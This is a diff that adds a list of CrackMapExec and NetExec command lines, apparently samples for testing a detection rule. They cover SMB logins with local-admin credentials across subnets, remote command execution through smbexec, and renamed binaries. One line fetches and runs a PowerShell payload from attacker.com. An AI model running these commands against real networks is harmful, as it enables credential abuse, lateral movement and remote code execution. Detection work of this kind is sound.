@@ -1,0 +1,12 @@
+cme.exe smb 192.168.1.100 --local-auth --username Administrator --password "P@ssw0rd123!" -x whoami
+cme.exe
+cme smb 172.16.10.5/24 -u 'user' -p 'pass' --local-auth
+cme.exe smb 192.168.1.0/24 -u"Administrator" -p"Password123!" --local-auth -x"whoami"
+update.exe smb 10.0.0.0/24 --username admin --password pass --local-auth --exec-method smbexec -x whoami
+copy powershell.exe cme.exe && cme.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+crackmapexec.exe smb 192.168.1.10/24 --user='admin' --pass='password' --local-auth
+netexec smb 172.16.10.5 -u 'Administrator' -p 'P@ssword123' --local-auth
+cme.exe smb 192.168.1.100 --local-auth --user Administrator --pass P@ssw0rd123
+crackmapexec.exe smb 172.16.5.0/24 --local-auth -u admin -p pass
+crackmapexec.exe smb 192.168.1.50 --local-auth -u admin -p pass --exec-method smbexec -X
+crackmapexec.exe smb dc01.internal.local --local-auth -u admin -p password
